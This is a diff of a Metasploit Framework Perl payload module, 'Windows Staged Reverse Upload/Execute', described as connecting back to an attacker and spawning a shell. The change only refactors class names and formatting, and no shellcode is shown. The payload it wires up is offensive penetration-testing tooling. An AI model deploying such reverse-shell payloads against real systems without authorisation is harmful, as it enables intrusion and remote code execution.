@@ -8,28 +8,37 @@
 ##
 
 package Msf::Payload::win32_reverse_stg_upexec;
+
 use strict;
-use base 'Msf::PayloadComponent::Win32UploadExecStage';
-sub _Load {
-  Msf::PayloadComponent::Win32UploadExecStage->_Import('Msf::PayloadComponent::Win32ReverseStager');
-  __PACKAGE__->SUPER::_Load();
-}
+use base 'Msf::PayloadComponent::Windows::ia32::UploadExecStage';
 
 my $info =
 {
-  'Name'         => 'Windows Staged Reverse Upload/Execute',
-  'Version'      => '$Revision$',
-  'Description'  => 'Connect back to attacker and spawn a shell',
-  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
+	'Name'         => 'Windows Staged Reverse Upload/Execute',
+	'Version'      => '$Revision$',
+	'Description'  => 'Connect back to attacker and spawn a shell',
+	'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
 };
 
-sub new {
-  _Load();
-  my $class = shift;
-  my $hash = @_ ? shift : { };
-  $hash = $class->MergeHashRec($hash, {'Info' => $info});
-  my $self = $class->SUPER::new($hash, @_);
-  return($self);
+sub _Load 
+{
+	Msf::PayloadComponent::Windows::ia32::UploadExecStage->_Import('Msf::PayloadComponent::Windows::ia32::ReverseStager');
+
+	__PACKAGE__->SUPER::_Load();
+}
+
+sub new 
+{
+	my $class = shift;
+	my $hash = @_ ? shift : { };
+	my $self;
+
+	_Load();
+
+	$hash = $class->MergeHashRec($hash, {'Info' => $info});
+	$self = $class->SUPER::new($hash, @_);
+
+	return($self);
 }
 
 1;
